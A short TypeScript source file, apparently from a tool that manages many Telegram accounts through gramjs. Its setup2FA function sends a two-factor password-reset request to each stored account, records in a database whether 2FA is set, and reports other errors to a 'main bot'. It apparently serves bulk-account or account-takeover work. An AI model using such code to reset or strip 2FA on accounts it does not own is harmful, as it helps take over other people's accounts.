import TelegramClient from '../../../gramjs/client/TelegramClient';
import GramJs from '../../../gramjs/tl/api';
import { Account } from '../../@types/Account';
import { updateAccountById } from '../../db/accounts';
import { sendToMainBot } from '../../helpers/sendToMainBot';
import { invokeRequest } from '../../modules/invokeRequest';

export const setup2FA = async (client: TelegramClient, account: Account) => {
  try {
    const { twoFa } = account;

    const resetPassword = await invokeRequest(
      client,
      new GramJs.account.ResetPassword()
    );
    if (resetPassword instanceof GramJs.account.ResetPasswordOk) {
      throw new Error('PASSWORD_EMPTY');
    }

    if (!twoFa) {
      await updateAccountById(client._accountId, {
        twoFa: true,
      });
    }
  } catch (e: any) {
    if (e.message === 'PASSWORD_EMPTY') {
      await updateAccountById(client._accountId, {
        twoFa: false,
      });
    } else {
      await sendToMainBot(
        `💀 DELETED_2FA_ERROR 💀
ID: ${client._accountId}
ERROR: ${e.message}`
      );
    }
  }
};
